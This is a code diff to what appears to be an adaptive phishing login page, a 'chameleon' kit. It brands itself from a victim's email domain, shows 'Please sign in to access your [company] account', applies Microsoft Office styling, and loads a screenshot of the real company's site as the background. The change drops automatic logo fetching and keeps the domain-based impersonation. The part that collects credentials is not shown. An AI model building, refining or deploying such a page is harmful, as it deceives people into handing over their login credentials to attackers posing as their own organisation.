@@ -121,39 +121,16 @@
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
     
-    /* Brand Header - Logo + Company Name */
+    /* Brand Header - Company Name Only */
     .brand-header {
-      padding: 20px 30px 14px;
+      padding: 24px 30px 16px;
       text-align: center;
       border-bottom: 1px solid #dbeafe;
       background: #f0f7ff;
     }
     
-    .brand-logo-wrapper {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin-bottom: 6px;
-      min-height: 70px;
-    }
-    
-    .brand-logo {
-      max-width: 120px;
-      max-height: 70px;
-      width: auto;
-      height: auto;
-      display: block;
-      border-radius: 4px;
-    }
-    
-    .brand-logo-fallback {
-      font-size: 48px;
-      color: #0078d4;
-      display: none;
-    }
-    
     .brand-name {
-      font-size: 20px;
+      font-size: 22px;
       font-weight: 700;
       color: #1a1a1a;
     }
@@ -424,12 +401,8 @@
   <!-- CHAMELEON CONTAINER -->
   <div class="chameleon-container" id="chameleonContainer">
     
-    <!-- Brand Header (Logo + Company Name) -->
+    <!-- Brand Header - Company Name Only -->
     <div class="brand-header" id="brandHeader">
-      <div class="brand-logo-wrapper">
-        <img class="brand-logo" id="brandLogo" src="" alt="Company Logo" onerror="this.style.display='none'; document.getElementById('logoFallback').style.display='block';">
-        <i class="fas fa-building brand-logo-fallback" id="logoFallback"></i>
-      </div>
       <div class="brand-name" id="brandName">Loading...</div>
     </div>
     
@@ -562,38 +535,19 @@
     // --- FETCH BRANDING AND BACKGROUND ---
     async function fetchBranding(domain) {
       try {
-        // Load logo from multiple sources
-        const logo = document.getElementById('brandLogo');
-        
-        // Try Clearbit first
-        logo.src = `https://logo.clearbit.com/${domain}?size=120`;
-        logo.onerror = function() {
-          // If Clearbit fails, try Google favicon
-          this.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=120`;
-          this.onerror = function() {
-            // If both fail, show a professional fallback icon
-            this.style.display = 'none';
-            const fallback = document.getElementById('logoFallback');
-            fallback.style.display = 'block';
-            fallback.className = 'fas fa-building brand-logo-fallback';
-          };
-        };
-        
         const nameParts = domain.split('.');
         const brandName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
         document.getElementById('brandName').textContent = brandName;
         document.getElementById('footerDomain').textContent = domain;
         
-        // Dynamic welcome text
         document.getElementById('heroTitle').textContent = `Welcome to ${brandName}`;
         document.getElementById('heroSub').textContent = `Please sign in to access your ${brandName} account.`;
         
-        // Office Blue Theme
         const color = '#0078d4';
         document.querySelector('.btn-submit').style.background = color;
         document.querySelector('.email-display').style.borderLeftColor = color;
         
-        // DYNAMIC BACKGROUND - try to load company screenshot
+        // DYNAMIC BACKGROUND
         const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
         const img = new Image();
         img.onload = function() {
